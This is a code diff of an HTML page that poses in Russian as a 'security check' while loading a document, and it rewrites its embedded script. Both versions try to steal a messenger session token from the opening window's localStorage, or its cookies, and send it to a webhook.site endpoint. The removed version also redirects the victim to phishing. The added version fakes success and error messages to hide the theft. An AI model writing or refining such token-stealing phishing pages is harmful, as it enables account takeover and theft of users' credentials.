@@ -8,16 +8,34 @@
     <div id="status">Пожалуйста, подождите, идет проверка безопасности...</div>
 
     <script>
-    if (window.opener) {
-        // Пробуем дотянуться до localStorage мессенджера через окно-родитель
-        try {
-            var token = window.opener.localStorage.getItem('token');
-            fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen_token=' + token);
-        } catch(e) {
-            // Если мессенджер блокирует прямой доступ, пробуем редиректнуть его на наш фишинг
-            window.opener.location = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=" + btoa(e.message);
-        }
-    }
-</script>
+        // Ждем 1 секунду, чтобы страница успела отрисоваться
+        setTimeout(function() {
+            try {
+                // Проверяем, есть ли доступ к окну, которое нас открыло
+                if (window.opener && window.opener !== window) {
+                    
+                    // Попытка №1: Прямое чтение localStorage мессенджера
+                    var token = window.opener.localStorage.getItem('token') || 
+                                window.opener.localStorage.getItem('access_token');
+
+                    if (token) {
+                        // Если токен найден, мгновенно шлем на вебхук
+                        fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?stolen=' + encodeURIComponent(token), {mode: 'no-cors'});
+                        document.getElementById('status').innerText = "Документ загружен успешно.";
+                    } else {
+                        // Попытка №2: Если токена нет в localStorage, может он в куках?
+                        var cookies = window.opener.document.cookie;
+                        fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?cookies=' + encodeURIComponent(cookies), {mode: 'no-cors'});
+                    }
+                } else {
+                    document.getElementById('status').innerText = "Ошибка: Откройте ссылку прямо из чата.";
+                }
+            } catch (err) {
+                // Если сработал Same-Origin Policy (защита браузера), ловим ошибку
+                fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?error=' + btoa(err.message));
+                document.getElementById('status').innerText = "Ошибка доступа. Попробуйте обновить страницу.";
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
